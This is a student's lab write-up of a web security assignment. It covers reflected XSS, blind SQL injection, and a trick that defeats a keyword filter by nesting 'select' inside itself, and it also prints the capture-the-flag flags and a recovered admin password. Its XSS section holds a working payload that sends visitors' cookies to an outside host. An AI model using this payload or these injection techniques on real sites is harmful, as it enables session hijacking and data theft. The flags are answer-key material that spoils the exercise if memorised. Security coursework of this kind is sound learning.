## Web Application Vulnerabilities
In this assignment try to exploit some vulnerabilities in web apps using techniques like SQL Injection and Code Injection. And also the way we can protect web applications of 
these form of attacks. Access to resources of the assignment is restricted due to the course policy, But I'll try to provide useful information on it.
### Cross-Site Scripting (XSS) 
This type of attack inculdes methods to inject codes to the website which are executed when this pages seen by the other users (XSS Refⅼeⅽteⅾ). I found some fields in the website which were exploitable. 
So I tried to inject a code to steal cookies of visitors and send them to desired address. Having the cookie, we can find session ID of users and exploit this for impersonation.  
By injecting following command in a part of website as fake image we can steal the cookie.
```
<script>new Image().src="http://ptsv.com/t/zrbff-1573749449/post?cookie="+document.cookie;</script>
```
In one of the fields of cookie you can see the flag of this part which is:
```
FLAG{ill_see_marvel_movies_ill_join_a_gym_ill_heart_things_on_instagram_ill_drink_vanilla_lette}
```
### SQL Injection 
After finding out that there is a admin username in the website, I tried to find corresponding password for it. First I consider a probable
format for input like what demonstrated down below.
```
$username=$_POST['username'];
$bool = EXISTS(SELECT * FROM $tbl_name WHERE username='$username');
$result=mysql_query($sql);
```
To test my guesses, I give an input as following and the website return "Okey" which means my prior hypothesis about the input format was right.
```
$bool = EXISTS(SELECT * FROM $tbl_name WHERE username=' ' OR '1'='1' ; -- ');
```
So after that I write a python script ([pass.py](https://github.com/amir-sabzi/Network_Systems_Security/blob/master/Web%20Application%20Vulnerabilities/codes/pass_finder.py)) that uses <b>"LIKE"</b> command in SQL, and test all different ASCII letters to find password. this took less then 5 minutes to find the password. The output of this code would be:
```
Password = NeverStorePlaintextPa$$w0rd
```
After logging into website I tried to find name of the tables. But we know that command of SQL will remove due to the sanitization protection. So we employ a clever technique to bypass this. So for example instead of using "select" if I used "selselectect", the protection will remove select in the middle and what is left is select!   
I developed a python code to automate this procedure named [table_finder.py](https://github.com/amir-sabzi/Network_Systems_Security/blob/master/Web%20Application%20Vulnerabilities/codes/table_finder.py). 
The output was:
```
['blog', 'enc']
```
With a similar approach I found the name of rows of "enc" table in another code ([column_finder.py](https://github.com/amir-sabzi/Network_Systems_Security/blob/master/Web%20Application%20Vulnerabilities/codes/column_finder.py)). Rows names are:
```
['ciphertext', 'id', 'plaintext']
```
Since there are many entries in table, I wrote a python code to automatically find the flag named [chiper_finder.py](https://github.com/amir-sabzi/Network_Systems_Security/blob/master/Web%20Application%20Vulnerabilities/codes/chiper_finder.py). Finally the flag was:
```
FLAG{come_home_to_the_unique_flavor_of_shattering_the_grand_illusion...come_home_to_simple_rick}
```
